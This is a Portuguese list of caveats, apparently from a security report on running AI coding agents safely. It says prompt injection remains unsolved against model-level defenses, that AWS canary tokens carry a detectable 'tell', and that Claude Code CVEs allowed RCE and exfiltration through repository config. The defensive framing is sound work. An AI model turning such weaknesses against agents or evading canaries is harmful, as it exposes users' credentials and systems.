- **Fontes secundárias sobre datas de GA**: as datas do Anthropic WIF (17/jun/2026 GA; service accounts debitando créditos separados desde 15/jun/2026) vêm de múltiplos blogs técnicos consistentes entre si e da doc oficial do Claude Platform; trate as datas exatas como bem-corroboradas mas confirme na doc antes de decisões contratuais.
- **Ecossistema em fluxo**: a lista de sandboxes/proxies (awesome-agent-runtime-security) muda semanalmente; muitos projetos citados têm meses de vida e maturidade heterogênea (vários são "research preview", incl. o Anthropic sandbox-runtime). Verifique estrelas/atividade/commits antes de depender de qualquer um em produção pessoal.
- **Prompt injection não está resolvido**: qualquer recomendação baseada em defesa no nível do modelo (CaMeL incluído) tem limites provados (Nasr et al., 2025); a aposta segura é contenção arquitetural.
- **Canary AWS tem "tell"** detectável por atacante sofisticado; é forte contra malware automatizado (o modelo de ameaça relevante aqui), fraco contra adversário manual que conheça o beacon.
- **Audit log nativo do GitHub é Enterprise-only**; a solução para conta pessoal (webhooks + log do broker) é um substituto, não equivalente.
- **CVEs do Claude Code** (CVE-2025-59536, CVSS 8.7, corrigido em 1.0.111; CVE-2026-21852, CVSS 5.3, corrigido em 2.0.65) mostram que a própria ferramenta teve RCE/exfiltração por config de repo; mantenha o Claude Code atualizado e nunca dependa só do consent dialog.